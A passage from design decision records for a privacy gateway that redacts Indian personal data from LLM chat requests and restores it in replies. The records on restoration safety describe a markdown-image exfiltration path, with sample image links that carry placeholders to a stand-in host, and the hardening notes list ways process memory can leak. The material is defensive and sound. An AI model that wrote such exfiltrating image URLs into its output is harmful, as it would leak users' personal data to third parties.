    are claimed by a validated phone, which wins rule 1)

  So order numbers, invoice numbers and the like will sometimes be redacted.
  The model then sees `[AADHAAR_1]` instead of the number and the user still
  sees the real one. That is the accepted cost. Phase 5 measures real text
  and may revisit this.

- Unvalidated candidates with context also catch typos (an Aadhaar with a
  wrong check digit next to "Aadhaar" is still mostly someone's Aadhaar).
- A POSSIBLE-but-invalid "phone" next to a phone keyword is redacted even
  when it is really something else (a date written 2024-05-01 near "call").
  Accepted: same recall-first reasoning.
- Values glued to letters are missed (`UID234567890123`). That is the price
  of not cutting into hashes and API keys. The README lists it.
- ~~A 4-4-4-4 number that fails the card checks still has its first 4-4-4
  checked as an Aadhaar.~~ Superseded by the fail-closed amendment below.
- Without a `+`, `91` + a mobile number is 12 digits. When those also pass
  the Aadhaar checks (about 1 in 12), both are validated and the same length,
  so type priority labels it Aadhaar. It is redacted either way.

**Amendment (accepted 2026-09-28, review of Phase 1b): fail closed.**

_Context._ Review asked two questions: does the ReDoS guard skip long input,
and can a detector match a piece of a longer number and leave the rest
visible? Probes found one gap for each (bug-log 6). The ReDoS guard skipped
nothing, but domain labels were capped at 63 characters, so an address with a
longer label was not detected at all. And across 9,000 Luhn-failing 16-digit
numbers with a valid mobile inside, about 11% had a 4-4-4 part redacted as an
Aadhaar with the other group left visible. libphonenumber can also return a
piece of a longer run (`202-555-0143` out of `+1 202-555-0143 7`).

_Decision._ Detection fails closed:

- **No length limits** anywhere in the patterns. A long input is scanned in
  linear time and a long value is redacted whole, never skipped.
- **Widen to the digit run.** After overlap resolution, each detection is
  widened to cover every run of digit groups it overlaps (same run grammar as
  the detectors: groups joined by 1–3 separators), then overlaps are resolved
  again. Types are decided before widening, so a valid card still beats an
  Aadhaar in its first 12 digits.

_Consequences._ A row number or quantity joined to a value by a space is
redacted with it ("Qty 2 4242 …" hides the 2). Over-redaction is the accepted
side, as elsewhere in this ADR. An oversized request is a gateway concern:
Phase 3 must reject bodies over its size limit with a 4xx, never forward them.

**Open issue (recorded 2026-09-28, to decide in Phase 5): widening merges
neighbours.** A run joins digit groups across 1–3 separators, so two values
separated only by a space, dot or hyphen form one run, and widening turns them
into one detection. Measured with generated Indian mobiles (`Call <a><sep><b>
today.`, 500 pairs each): `" "`, `"  "`, `" - "` and `"."` gave one merged
detection in 500/500; `" and "` gave two. Both values are still redacted, so
nothing leaks, but it over-redacts, and it breaks determinism at the value
level: a number gets one placeholder when it stands alone and is folded into a
different, merged placeholder when a neighbour is written next to it. Not
changed now. Phase 5 decides, with measurements, whether widening should stop
at a run boundary between two accepted detections.

**Amendment (2026-10-01, ADR-026): widening is what makes a lost overlap
safe.** Exempting IP detections from widening (so that `IPv4 203.0.113.5`
would not take the `4`) sent a mobile number: libphonenumber read
`3 <mobile>` starting inside the address, the address won the overlap,
and nothing covered the rest (bug-log 31). IP is widened like every type,
except over a first digit group glued to a letter (`widenAddress` in
`detect.ts`); such a group is part of a word, and the safety net still
takes it if it is long enough. Rule for any future type or claim: opting
out of widening, or winning an overlap without being redacted, needs an
argument for the loser's text. Two addresses joined by a space or hyphen
now also merge into one detection (this open issue, 5c).

---

<a id="adr-011"></a>

## ADR-011: Safety net — long numbers nobody claimed are redacted as NUMBER

**Context:** Bug-log 8. Two Indian mobiles glued by `-`, `--`, `[`, `]` or
`)` with no space were both sent unredacted (200/200 pairs each), and with
`+` one of the two (187/200). Each detector recognises a shape, and an
unusual layout breaks the shape, so nothing claims the digits. Indian bank
account numbers (9 to 18 digits) have no detector at all.

**Options considered:**

- **A phone-only fallback:** look for 10-digit Indian mobiles inside runs
  libphonenumber rejected. Fixes bug 8 and nothing else; the next odd layout
  or type leaks again.
- **A general safety net** (chosen by the user): after every detector has
  run, any stretch of at least N digits that none of them claimed is redacted
  as a generic `NUMBER`, with the lowest overlap priority.

**Measurement (2026-09-28)**, to choose N and whether a space joins digits.
200 samples per format (seed 42), `detect()` at the bug-7 commit; a cell is
the share of samples with an unclaimed stretch of at least N digits.
Joiners: `.`, hyphen and dashes, `(` `)` `[` `]` `+`, 1–3 between groups,
with or without the space.

| Not personal data                                                                                                     | N=8     | N=9, space joins | **N=9, no space** | N=11, no space |
| --------------------------------------------------------------------------------------------------------------------- | ------- | ---------------- | ----------------- | -------------- |
| `2024-09-28`, `28-09-2024`, `28.09.2024`, `1998-2024`                                                                 | 100%    | 0%               | **0%**            | 0%             |
| `2024-09-28 14:30`                                                                                                    | 100%    | 100%             | **0%**            | 0%             |
| `28-09-2024 14:15`                                                                                                    | 73%     | 73%              | **0%**            | 0%             |
| `2024-09-28 - 2024-10-05`                                                                                             | 100%    | 100%             | **0%**            | 0%             |
| table row `12 34 56 78 90`                                                                                            | 22%     | 22%              | **0%**            | 0%             |
| `28/09/2024`, `Rs 1,25,000`, `₹12,34,56,789.50`, `$1,234,567.89`, `10:00-12:30`, `v1.2.3`, PIN code, `INV/2024/00123` | 0%      | 0%               | **0%**            | 0%             |
| 8-digit amount or order number                                                                                        | 100%    | 0%               | **0%**            | 0%             |
| 9–10-digit amount without commas                                                                                      | 68%     | 68%              | **68%**           | 0%             |
| 10-digit Unix timestamp                                                                                               | 37%     | 37%              | **37%**           | 0%             |
| IPv4 `192.168.100.200`                                                                                                | 79%     | 75%              | **75%**           | 48%            |
| order ID `403-1234567-1234567`, 12-digit tracking number, ISBN, `10.0.19045.3693`                                     | 89–100% | 89–100%          | **89–100%**       | 89–100%        |
| git SHA (40 hex)                                                                                                      | 24%     | 14%              | **14%**           | 4%             |
| UUID                                                                                                                  | 20%     | 12%              | **12%**           | 3%             |

| Personal data left by the detectors                             | N=8  | N=9, space joins | **N=9, no space** | N=11, no space |
| --------------------------------------------------------------- | ---- | ---------------- | ----------------- | -------------- |
| bug 8: `<a>-<b>`, `<a>[<b>`, `<a>]<b>`, `<a>)<b>`               | 100% | 100%             | **100%**          | 100%           |
| bug 8: `<a>+<b>` (the second number)                            | 97%  | 97%              | **97%**           | 0%             |
| bare 9–18-digit account number                                  | 89%  | 89%              | **89%**           | 72%            |
| bare 9-digit account number                                     | 100% | 100%             | **100%**          | 0%             |
| 16-digit number failing Luhn, `4-4-4-4` with spaces, no keyword | 85%  | 85%              | **0%**            | 0%             |
| 12-digit Aadhaar shape failing Verhoeff, spaced, no keyword     | 88%  | 88%              | **0%**            | 0%             |

(The remaining share of each personal row was already claimed by a
detector, mostly as a phone.)

**Decision (accepted 2026-09-28):**

- **N = 9** (`MIN_NUMBER_DIGITS`). 8 catches every 8-digit date; 10 misses
  9-digit account numbers; 11 also misses the `+` case of bug 8.
- **A space does not join digits.** With a space, dates with times, date
  ranges and table rows reach 9 digits. The price: numbers written in spaced
  groups that fail their checks stay under ADR-010 (caught only with a
  keyword), as before.
- **Joiners:** `.`, `-`, U+2010–U+2015, U+2212, `(`, `)`, `[`, `]`, `+`, 1–3
  of them between digit groups. Not comma, slash, colon, underscore or
  letters.
- **Glue is ignored.** Unlike the detectors (ADR-010), the net does not care
  what the digits touch, so `UID<12 digits>` and `<a>_<b>` are caught.
- **Where it runs:** in `detect()`, on the normalised text, after widening,
  over the digits no detection claimed. A run that is partly claimed is split
  at the claim, and each leftover piece is trimmed of joiners and counted on
  its own. The net never takes digits from a real detection.
- **Priority:** `NUMBER` is last in `DETECTION_TYPES` (amends ADR-003),
  unvalidated, with no context keywords. Placeholders will read `[NUMBER_N]`.

**Consequences:**

- Bug 8 is closed, and so is the by-design `_` gap of ADR-010. Numbers of 9+
  digits glued to letters are caught as `NUMBER` (not as their real type).
- **Accepted cost** (redacted though not personal, restored in the reply):
  amounts of 9+ digits without separators, order IDs and tracking numbers,
  10-digit timestamps, build numbers, ISBNs, IPv4 addresses with 9+ digits
  (personal data anyway; the Phase 5 IPv4 detector will take them over by
  priority), and a digit stretch in about 1 in 7 git SHAs and 1 in 8 UUIDs.
  A number inside a URL is redacted too; if the model echoes the URL, the
  Phase 2 restoration-safety rule leaves the placeholder there. Phase 5
  measures both.
- Some rows of small numbers were already claimed as phone numbers by
  libphonenumber (`12 34 56 78 90` is a valid Indian number); that is an
  ADR-010 cost, not the net's.
- The net is one regex pass plus a walk over the claimed spans, linear time
  (tested).

**Amendment (2026-09-30, Phase 5b, ADR-022 item 7): the net takes the
whole token.** "Glue is ignored" used to mean the digits were cut out of
whatever they were glued to: `UID` stayed, and so did the other 31
characters of a 40-character hexadecimal token (about 1 in 7 of them has a
9-digit stretch, see the table). The 5a evaluation counted that as a
partial leak of a secret. A NUMBER is now widened over the letters,
digits, combining marks and underscores glued to it on both sides
(`TOKEN_CHAR`, the same "glued" characters the detectors look at), never
into a span a real detection claimed; two long stretches in one token
give one detection, and the token is walked once (linear time, tested).
Joiners (`.`, `-`, brackets, `+`) are not token characters:
`order-123456789-delivered` still loses only its digits. Cost: words typed
without a space around a number go with it (`number9876543210hai`), so the
model sees less; privacy is not affected, and the text is restored.

**Amendment (2026-10-01, Phase 5b, ADR-026):** an IP address of any length
is claimed by the IP detector first, so "an IPv4 address with 9 or more
digits" leaves the list of accepted costs. Addresses no single host owns
(a netmask, the broadcast address, a multicast group) are held back from
the net when no detection touches them: they are known not to be
personal. A Windows build number (`10.0.19045.3693`) is not an address
and is still the net's.

---

<a id="adr-012"></a>

## ADR-012: The per-request mapping is not encrypted in memory

**Context:** The project brief's design already states this as a preliminary decision;
this is the formal ADR, written alongside `PlaceholderMapping`
(`src/redaction/mapping.ts`, Phase 2), which is where the decision actually
takes effect.

**Options considered:**

- Encrypt placeholder → value entries in memory with a key generated per
  request, decrypting only to redact/restore.
- **Do not encrypt.** Keep the mapping as a plain in-memory structure, alive
  only for the lifetime of one request (including its stream), then let it be
  garbage collected.

**Decision:** Do not encrypt.

**Why:** the encryption key would have to live in the same process as the
data it protects (there is nowhere else to put it for a single, short-lived
request), so encrypting adds no real protection against anyone who can already
read the process's memory. It would add real cost (CPU, code, a new
dependency) for a threat model it does not change.

**Consequences:**

- `PlaceholderMapping` holds real values as plain JS strings, referenced only
  by the mapping instance created for one request. The gateway (Phase 3) must
  drop its reference as soon as the request or its stream ends, so nothing
  keeps the mapping (or the strings in it) alive past that point.
- **JS strings cannot be reliably wiped from memory.** They are immutable, and
  the engine may have copied, interned or moved them; there is no API to
  overwrite the bytes. Dropping every reference lets the garbage collector
  reclaim them on its own schedule, which is best-effort, not a guarantee.
  The threat model (README) must say this plainly: a compromised host reading
  process memory during or shortly after a request could still recover
  values, whether or not the mapping was "encrypted".
- Production must disable core dumps and heap snapshots (Phase 8, Docker/
  deployment concern), since either would capture the mapping's plain values
  whole. Followed through in Phase 3 by a start-up guard (ADR-016).
- Logging and error handling (already covered by "Errors and logs" in
  the project brief) remain the actual defence for the case that matters day to day:
  the mapping must never be serialised, logged or included in an error,
  encrypted or not.

---

<a id="adr-013"></a>

## ADR-013: Redaction module design — placeholders, the per-request mapping, and value keys

**Context:** Phase 2 turns `detect()`'s offsets (`src/detection/detect.ts`)
into the placeholders a provider sees, and back. Design approved 2026-09-28;
this ADR records it as built, in `src/redaction/`.

**Decision: five small modules, not one.**

- `placeholder.ts`: `formatPlaceholder(namespace, index)` → `[TYPE_N]`,
  `MAX_PLACEHOLDER_INDEX = 9999` (ADR-002), `PLACEHOLDER_INDEX_PATTERN`
  (below), and `PlaceholderLimitError`. Namespace is `DetectionType |
'LITERAL'` (`PlaceholderNamespace`): `LITERAL` is not a detection type
  (nothing detects it), it is the separate pool ADR-002 created for
  placeholder-shaped text found in the user's own input.
- `mapping.ts`: `PlaceholderMapping`, one instance per request. One counter,
  one key→entry map and one index→entry map per namespace, so
  `getOrAssign`/`reserve`/`lookup` are all O(1). `getOrAssign(namespace, key,
value)` returns the existing placeholder for `key` or assigns the next free
  index (skipping reserved ones); the entry keeps `value`, the first surface
  form seen, for restoration later. `reserve(namespace, index)` is ADR-002's
  loose-variant reservation: skip the index if unclaimed, or mark the
  existing entry `exactOnly` if a real value already has it.
- `variants.ts`: the one grammar `redact.ts` and `restore.ts` both build
  their patterns from (below), so LITERAL detection, reservation and
  tolerant restoration can never disagree about what counts as a variant of
  `TYPE_N` (ADR-002's "one grammar, shared" rule).
- `redact.ts`: `redactMessage(text, mapping)`, called once per message, in
  order, against one shared mapping — this is what "Stateless, deterministic
  redaction" (the project brief) actually reduces to: no state carries between
  requests, only between messages of the _same_ request, in the mapping
  instance itself.
- `unsafe-regions.ts` and `restore.ts`: restoration and restoration safety
  (below).

**Value keys** (what `getOrAssign` deduplicates on, so the same real-world
value gets one placeholder however it is written):

| Type                  | Key                                                                                                                                                      |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Aadhaar, Card, Number | digits only (`normalise(surface).text` with everything but `0-9` stripped)                                                                               |
| PAN                   | `normalise(surface).text.toUpperCase()`                                                                                                                  |
| Email                 | `normalise(surface).text.toLowerCase()`                                                                                                                  |
| Phone                 | `parsePhoneNumberFromString(normalise(surface).text, { defaultCountry: 'IN' })`'s E.164 form, or the normalised surface text if that returns `undefined` |
| Literal               | the exact matched text (case-sensitive), so `[PAN_1]` and `[pan_1]` are two different literals, each restored byte-for-byte                              |

`surface` is always `detect()`'s span sliced from the **original** text (not
normalised), matching how a value is sent if left unredacted; it is
re-normalised here only to compute the key.

**The phone fallback is not defensive padding.** libphonenumber's own
`extended: true` POSSIBLE search (`phone.ts`, ADR-010) accepts shapes that
`parsePhoneNumberFromString` — used here for the key — cannot parse into any
number at all (measured: about 1 in 5,600 random unvalidated-phone-shaped
candidates against `defaultCountry: 'IN'`, e.g. `"0 0287369447"`). Falling
back to the normalised surface text means the request still gets one
placeholder instead of throwing; it is exercised in
`test/unit/redaction/redact.test.ts` with a real input that triggers it, not
mocked.

**The index grammar is exactly `formatPlaceholder`'s (finalised 2026-09-29,
review question).** `PLACEHOLDER_INDEX_PATTERN = '[1-9][0-9]{0,3}'`: 1 to 4
digits, no leading zero — precisely the set of strings `String(n)` produces
for `n` in `1..MAX_PLACEHOLDER_INDEX`. `[PAN_01]` and `[PAN_10000]` are
_not_ placeholder-shaped by this grammar, for LITERAL detection, reservation
or restoration: Pseudonym itself can never have produced either string, and a
provider rewriting `[PAN_1]` has no reason to invent one, so there is no
ambiguity for the grammar to resolve. Both are left exactly as typed,
everywhere (tested: `variants.test.ts`, `restore.test.ts`).

**Consequence, worked through (review question): `[CARD 4111111111111111]`
is not literal-shaped.** Its "index" is 16 digits — far past the 4-digit
cap — so the whole bracket does not match `LITERAL_PATTERN` at all. detect()
still finds the 16 digits on their own: a **space** before a digit run is not
"glued" (only a letter, digit, mark or underscore counts — digit-runs.ts), and
`]` after it is not glued either, so a real, validated card sits there as an
ordinary CARD candidate. Redacting `See [CARD 4111111111111111] please.`
therefore gives `See [CARD [CARD_1]] please.`: the surrounding `[CARD ` and
`]` are left as ordinary text (nothing matches them on their own), and the
digits are redacted as a real value, not a literal. Either way the card
number is never in the output — confirmed
(`redact.test.ts`, "an index over 4 digits is not literal-shaped"). An
underscore-separated bracket never reaches this question at all: the digits
are glued to `_`, so no detector's window can start there, whatever the
index length.

**LITERAL detection reuses one dynamic tag list.** The pattern is built from
`[...DETECTION_TYPES, 'LITERAL']`, so `[AADHAAR_1]`, `[aadhaar 1]` and
`[LITERAL_1]` (the recursion rule, ADR-002) are all recognised, case-
insensitively, with either `_` or a space before the index — deliberately the
same shapes tolerant restoration will accept, per ADR-002's "one grammar,
shared" rule (`variants.ts`'s `bracketPattern`). Because the list is derived
from `DETECTION_TYPES`, a future type (PERSON in Phase 6, IFSC/UPI/IP in
Phase 5) is covered by LITERAL detection, reservation and restoration
automatically, with no change to `redact.ts` or `restore.ts`.

**The final tolerant-restoration grammar (2026-09-29, this session).** Three
shapes, defined once in `variants.ts` and consumed by both the reservation
scan (`redact.ts`) and restoration (`restore.ts`):

| Shape                                          | Case                         | Namespaces                   |
| ---------------------------------------------- | ---------------------------- | ---------------------------- |
| Bracketed `[TYPE_N]` / `[type_n]` / `[Type N]` | any case                     | every namespace              |
| Bare, underscore: `TYPE_N` / `Type_N`          | UPPERCASE or Title Case only | every namespace              |
| Bare, space: `TYPE N` / `Type N`               | UPPERCASE or Title Case only | **AADHAAR and LITERAL only** |

The bare-space row is the narrow one, and it covers **every case**, not just
Title Case: `"CARD 1"` is excluded exactly like `"Card 1"` (review question
1). The reasoning is the same for both — `CARD`, `PAN`, `PHONE`, `EMAIL` and
`NUMBER` are ordinary English words that pair naturally with a number at a
sentence's start regardless of how that sentence happens to capitalise them
("Card 1 is declined", "our Number 1 priority", a receipt printed in caps:
"CARD 1 DECLINED") — so restoring the bare-space form would rewrite a
sentence that was never a placeholder. `PERSON` (no detector until Phase 6)
is pre-emptively excluded from the bare-space row for the same reason
("Person 1 agreed to the terms" is exactly the kind of sentence Pseudonym's
own users write). `AADHAAR` is not an English word, and `LITERAL` never
occurs in ordinary prose, so both keep it. Tested per namespace, including
`"CARD 1"` explicitly (`restore.test.ts`).

**Reservation shares this grammar exactly (review question 2), so a
namespace excluded from the bare-space row is also excluded from bare-space
reservation.** `"Card_1"` typed as ordinary prose still reserves CARD index 1
(bare-underscore is in the grammar for every namespace); `"Card 1"` and
`"CARD 1"` do not reserve anything for CARD, in either case, because
restoration was never going to treat that text as a placeholder variant in
the first place — there is nothing left to protect a real `[CARD_1]` from.
`"Aadhaar 1"` still reserves AADHAAR index 1, since AADHAAR keeps the
bare-space row. Tested: `redact.test.ts`, "loose-variant reservation".

**Reservation's "looks backward only" rule (ADR-002 amendment, confirmed by
how `reserve` is implemented):** a reservation found while scanning message N
only ever affects indices from message N onward. An index a real value
already holds (assigned while redacting an earlier message) is never
reassigned or shifted — `reserve` flips that entry's `exactOnly` flag
instead, so restoration will only ever match its bracketed form
(`[TYPE_N]`) from then on, never a bare one. This is what keeps the redacted
prefix already sent to the provider byte-stable across a growing history
(needed for provider-side prompt caching): renumbering an earlier placeholder
because a later message happens to contain ordinary prose shaped like one
would change text the provider already cached. A loose variant that overlaps
a literal bracket (`"CARD_1"` inside `"[CARD_1]"`, which becomes
`[LITERAL_1]`) does not reserve either: that text will not appear as bare
prose in the output, so nothing is left for a real `CARD_1` to be confused
with.

**`unsafe-regions.ts`: `unsafeRegions(text)` and `isInUnsafeRegion`.**
Restoration safety (the project brief) needs to find, conservatively, the URLs,
markdown link/image targets and HTML attribute values in a provider's reply.
Not a full URL/HTML/markdown parser. A markdown destination is either the
whole `<…>` form up to its `>` (CommonMark lets it contain spaces) or runs to
the first whitespace, because CommonMark allows balanced parentheses inside
one; the first version stopped at the first `)` and let
`![x](https://a.example/?q=(1)[AADHAAR_1])` be restored (bug-log 13). That
destination grammar applies after `](` (inline) and after `[label]:`
(reference definitions, used as `![x][label]`); the reference form was
missed at first and `[ref]: <https://…?d= [AADHAAR_1]>` was restored
(bug-log 14). The reference pattern is unanchored, so it also covers
definitions in block quotes and list items, at the cost of leaving the token
after any `[…]:` in prose unrestored. Any quoted HTML attribute value is covered; a bare URL needs
`scheme://`, `mailto:`, or a dotted host (any case) directly followed by `/`.
Known gaps, none on the automatic image-fetch path: a bare host followed by
`?` with no `/` and no scheme, a bare IP address with no scheme, and an
unquoted attribute that does not look like a URL (full list: the project brief,
Phase 8 notes; each is pinned by a negative test). Five independent patterns often find the same URL more than
once (a bare `https://…` inside a markdown target and inside a quoted `href`
alike); `unsafeRegions` merges overlapping hits into one region so the result
is a plain, non-overlapping list. Getting this wrong in the _unsafe_
direction would matter (a gap here is exactly the exfiltration path the project brief
describes), so it fails toward marking more text unsafe, not less — matching
the safety net philosophy of ADR-011.

**`restore.ts`: `restore(text, mapping, options?)`.** Collects every bracket
match first, then every bare match (underscore, then space-restricted) that
does not overlap a bracket match (both patterns can match the same inner
text as a bracket — `[` and `]` are not glue characters — so the bracket, the
more specific shape, wins). For each surviving candidate, in text order: look
it up in `mapping`; restore only if an entry exists, the match is bracketed
or the entry is not `exactOnly`, and (unless `options.restoreInUnsafeRegions`
is set) it is outside every `unsafeRegions` span. An unknown, invented,
malformed (`[PAN_01]`) or out-of-range (`[PAN_10000]`) placeholder is left
exactly as found — restore() never manufactures or guesses a value.

**Open question (end of Phase 2): the literal-overlap filter is unreachable
today.** `redactMessage` drops any real detection that overlaps a literal
span. Since the index cap (bug-log 11), no current detector can produce that
overlap: 0 of 139,986 probes (every tag, both separators, every index
1–9999, with every keyword nearby), and removing the filter fails no test
(mutation M9, testing guide). Kept for now as a guard for Phase 5 detectors
(IFSC, UPI, secrets), whose shapes are not known yet. Decide in Phase 5:
keep it plus a sampled "no detector overlaps a literal" test, or remove it.

> **Correction (2026-10-03, bug-log 58):** the filter was never
> unreachable. The probes placed a placeholder-shaped text and values near
> each other, never glued to each other. Glued, a detection reaches into
> the literal through steps that run after a pattern matches: the safety
> net joins digits across `[` and `]` and takes the glued token (ADR-011,
> ADR-029), a keyword secret's value runs to the next blank (ADR-022), and
> an email's local part may start with a combining mark in the `]`'s
> cluster. The filter then dropped that detection whole and its value was
> sent. Mutation M9 survived for the same reason the probes missed it. See
> bug-log 58 and [ADR-037](#adr-037).
> **Fixed the same day:** such a detection is now cut around the literal,
> never dropped (bug-log 58).

**Test data:** generated Aadhaar/PAN/email/phone values (ADR-009) are
compared with `assertTextEqualQuietly` (`test/support/quiet-text.ts`) rather
than plain `toBe`: unlike `detect()`'s offset-only results, redacted or
restored text still contains the real value when the code under test is
wrong, which is exactly the failure a plain assertion would print.
Literal-placeholder syntax (`[AADHAAR_1]` as text), a PAN (no checksum, so a
hand-picked one carries no more re-identification risk than any other
string), and the one published Visa test number carry no such risk and are
compared directly. `round-trip.test.ts` runs the full cycle — `redactMessage`
then `restore` against the same mapping across a multi-message history —
including the project brief's documented markdown-image exfiltration attack end to
end.

---

<a id="adr-014"></a>

## ADR-014: The request and response allowlist

**Context:** Phase 3 accepts OpenAI's `POST /v1/chat/completions`. The
history is redacted, but a request can carry free text in other places:
`messages[].name`, the top-level `user` (often an email), `metadata`, `stop`,
tool descriptions, and any field OpenAI adds in future. Anything forwarded
unexamined is a leak path.

**Options considered:**

- Denylist: forward everything except known-dangerous fields. Fails open:
  any field nobody thought of goes to the provider as written.
- Redact every string anywhere in the body. Hides values in fields the
  provider interprets structurally (schema names, enum values), and still
  forwards names, which cannot be detected until Phase 6.
- **Allowlist:** every field has a fate; anything else is a 400.

**Decision:** the allowlist, with four fates:

| Fate                               | Fields                                                                                                                                                                                                                                                                                                                                                                                                      |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Redacted                           | `messages[].content` (string, or an array of `{type: "text", text}` parts), `stop` (string or up to 4 strings)                                                                                                                                                                                                                                                                                              |
| Forwarded (numbers and enums only) | `temperature`, `top_p`, `max_tokens`, `max_completion_tokens` (sent as `max_tokens`), `seed`, `frequency_penalty`, `presence_penalty`, `reasoning_effort`, `response_format` (`text` or `json_object`), `n` (only 1), `logprobs` (only false), `stream` (only false)                                                                                                                                        |
| Dropped                            | `user`, `safety_identifier`: their only purpose is to identify the end user to the provider, exactly what Pseudonym exists to prevent. Ollama ignores `user` anyway                                                                                                                                                                                                                                         |
| Rejected (400)                     | `messages[].name` (names cannot be redacted before Phase 6), roles `tool`/`function`/`developer`, non-text parts, `tools` and the other tool fields, `metadata`/`store`, `stream: true`, `stream_options`, `logprobs: true`, `top_logprobs`, `logit_bias`, `audio`, `modalities`, `prediction`, `web_search_options`, `response_format: json_schema` (free-text descriptions), and **any field not listed** |

`null` counts as "unset" for every optional field, since OpenAI clients send
it (bug-log 15 was the two validation passes disagreeing about exactly this).

Further rules:

- **Error messages never quote a received value or an unknown key's name**
  (a key can itself be personal data: `{"priya@example.com": 1}`). Paths are
  built from our field names and indices only.
- **The model must match `PSEUDONYM_MODEL` exactly, or 400.** This means a
  client must change the model name as well as the base URL: "change the
  base URL only" is not true for Pseudonym, and the README says so. Accepted
  because the alternative (forward any model name) lets a client pick any
  model on the provider, and silently substituting ours would hide a
  misconfiguration.
- **Text parts are joined with a space** and sent as one string, so
  detection runs on exactly the text the provider receives. Space, not
  newline: spaces are number separators to the detectors, so a card split
  at a group boundary across two parts is one card again.
- **A provider 4xx becomes a 502 with a fixed message** naming only the
  status (`the provider returned an error (status 400)`). Deliberate: the
  provider's error body can echo the prompt, so it is never forwarded or
  logged, and without that body a provider 4xx is nothing the client could
  act on differently from a 5xx.
- **The response is built field by field:** `id`, `object`, `created`,
  `model` (ours), one choice with `role` and restored `content`, and
  `finish_reason`, plus `usage` when sent. Everything else Ollama adds
  (`reasoning` from thinking models, `timings`, `_debug_info`) is dropped; a
  `tool_calls` answer or null content is a 502.

**Consequences:**

- Clients that send `name`, tools, images or streaming get a clear 400
  instead of a silent partial service.
- Known gap, found while building this (not a Phase 3 regression: it
  applies to any message): a number with a line break between its digit
  groups (`4111 1111`, newline, `1111 1111`) is not detected at all. Each
  half is below the NUMBER net's 9 digits, and number layouts only join
  across spaces. A value deliberately split across _messages_ is the same
  case. The README lists it; Phase 5 decides whether digit runs should join
  across single line breaks (a design question: it would also join dates
  and amounts on adjacent lines).

**Amendment (2026-09-29, Phase 4b, ADR-019): streaming is accepted.**
`stream` may be `true`, and `stream_options` moves from "rejected" to
"forwarded": a strict object whose only field is `include_usage` (a
boolean), allowed only with `stream: true` (a 400 otherwise, as OpenAI
does). Any other stream option (`include_obfuscation`, say) is an unknown
field: a 400 that does not name it. The streamed response is built field
by field too (ADR-019); `reasoning`, `timings` and the provider's model
name are dropped from every chunk.

---

<a id="adr-015"></a>

## ADR-015: Request body limit — 256 KiB

**Context:** Redaction is synchronous. While one request is being
redacted, the event loop serves nothing else, so the body limit is also the
worst-case stall for every other client.

**Measured (2026-09-29, i5-12450H, Node 22.17.1):** JSON parse plus
`redactMessage` over every message, best of 3, seeded synthetic data,
timings only printed.

| Body   | Chat history (prose, ~1 value per 25 words) | One pasted document | Pasted CSV (dates, IDs, amounts, phones) |
| ------ | ------------------------------------------- | ------------------- | ---------------------------------------- |
| 8 KB   | 8 ms                                        | 9 ms                | 31 ms                                    |
| 32 KB  | 30 ms                                       | 40 ms               | 124 ms                                   |
| 64 KB  | 59 ms                                       | 56 ms               | 264 ms                                   |
| 128 KB | 116 ms                                      | 127 ms              | 482 ms                                   |
| 256 KB | 247 ms                                      | 266 ms              | 1,072 ms                                 |
| 512 KB | 492 ms                                      | 531 ms              | hits the 9,999 PHONE limit               |
| 1 MB   | 972 ms                                      | 1,037 ms            | —                                        |

Linear: about 1 ms/KB for prose, about 4 ms/KB for digit-heavy text. (The
earlier "~2.1 ms/KB" figure in ADR-004 came from a different corpus.)

**Options considered:** Fastify's default 1 MiB (about 4 s worst-case
stall); 128 KiB (about 0.5 s worst case, but about 32k English tokens, a
tight fit for hosted models later); **256 KiB**.

**Decision:** `PSEUDONYM_MAX_BODY_BYTES`, default 262,144. About 64k
English tokens, more than any local Ollama model's context; worst realistic
stall about 0.25 s for prose and about 1.1 s for a digit-heavy paste. Over
the limit is a 413 naming the limit. The limit counts bytes, so text in
Indian scripts (3 bytes per character in UTF-8) gets fewer characters,
which errs on the cheap side.

**Consequences:** moving redaction to worker threads is the fix if the
stall ever matters; not now (rule 7). The `PlaceholderLimitError` (422)
bounds a different resource, distinct values per type, and a 512 KB CSV
already reaches it.

---

<a id="adr-016"></a>

## ADR-016: Production hardening — no dumps, no inspector, and Node ≥ 22.20

**Context:** ADR-012 keeps the per-request mapping as plain strings and
requires production to disable core dumps and heap snapshots. On Node,
checked against the v22 CLI docs and core(5) on 2026-09-29:

- Heap snapshots need `--heapsnapshot-signal`,
  `--heapsnapshot-near-heap-limit`, the inspector, or code calling
  `v8.writeHeapSnapshot()` (we never do).
- **On Linux, SIGUSR1 starts the inspector** in any Node process, sent by
  any process allowed to signal it. `--disable-sigusr1` turns that off:
  added in v22.14.0, no longer experimental from v22.20.0.
- Diagnostic reports (`--report-on-signal`, `--report-on-fatalerror`,
  `--report-uncaught-exception`) include environment variables, so the
  provider API key.
- Node calls `abort()` on fatal errors (out of memory), which dumps core if
  `RLIMIT_CORE` > 0; `--abort-on-uncaught-exception` does it for any
  uncaught error.
- **Every one of these flags is allowed in `NODE_OPTIONS`** (checked with
  `process.allowedNodeEnvironmentFlags` on 22.17.1, and
  `NODE_OPTIONS=--disable-sigusr1` runs), and flags given there do **not**
  appear in `process.execArgv`.
- **core(5): "The RLIMIT_CORE limit is not enforced for core dumps that are
  piped to a program"**, i.e. when the host's `core_pattern` starts with
  `|` (systemd-coredump, apport). That is host configuration a container
  cannot change.

**Options considered:** document it only; `prctl(PR_SET_DUMPABLE, 0)` via a
native addon (would also stop piped dumps, but a native dependency for one
call); **a start-up guard plus documentation**.

**Decision:** `checkProductionHardening` (`src/hardening.ts`), run by
`main.ts` when `NODE_ENV=production`: a pure function over `platform`,
`execArgv`, `NODE_OPTIONS`, `/proc/self/limits` and `core_pattern`.

> **Amended 2026-10-10 by ADR-047** (the user's ruling): the guard no
> longer depends on `NODE_ENV`. It runs on every start unless
> `PSEUDONYM_DISABLE_HARDENING=true`. The checks themselves are unchanged.

- **Refuses to start** if any dump or inspect flag is set, in argv or
  `NODE_OPTIONS` (`_` and `-` treated alike; `--flag=value` and quoted
  values handled); on Linux also if `--disable-sigusr1` is missing, or the
  soft core limit is not 0 or cannot be read.
- **Warns** if `core_pattern` pipes to a handler, and on any non-Linux
  platform (nothing about dumps can be verified there).
- `npm start` runs `node --disable-sigusr1`. The Docker flags
  (`--ulimit core=0`) come in Phase 8.
- **`engines.node` raised to `>=22.20.0`** and `.nvmrc` to `22.23.3` (newest
  22.x, released 2026-09-23), so the flag production depends on is never
  experimental. The development machine runs 22.17.1, below the new
